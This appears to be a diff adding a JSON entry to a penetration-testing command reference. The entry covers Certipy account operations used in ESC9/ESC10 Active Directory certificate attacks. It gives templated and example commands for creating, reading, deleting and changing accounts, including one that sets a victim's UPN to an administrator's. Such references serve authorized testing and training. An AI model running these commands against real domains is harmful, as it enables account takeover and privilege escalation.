@@ -1,0 +1,23 @@
+{
+  "id": "certipy-account",
+  "name": "Certipy Account Operations",
+  "command": "certipy account create -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user <new_account> -pass <new_password>",
+  "description": "Create, update, read, or delete user / computer accounts directly through Certipy. Particularly useful for ESC9/ESC10 chains where you need to update an account's UPN or sAMAccountName mid-attack.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["certipy", "adcs", "esc9", "esc10", "account", "upn"],
+  "variations": [
+    { "label": "Update UPN (ESC9/10)", "requires": "password", "command": "certipy account update -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user <target> -upn '<new_upn>'" },
+    { "label": "Read Account", "requires": "password", "command": "certipy account read -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user <target>" },
+    { "label": "Delete Account", "requires": "password", "command": "certipy account delete -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user <target>" }
+  ],
+  "references": [
+    { "title": "Certipy README", "url": "https://github.com/ly4k/Certipy" },
+    { "title": "ESC9 / ESC10 Writeup", "url": "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7" }
+  ],
+  "examples": [
+    "certipy account update -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -user victim -upn 'administrator@corp.local'",
+    "certipy account read -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -user victim"
+  ]
+}
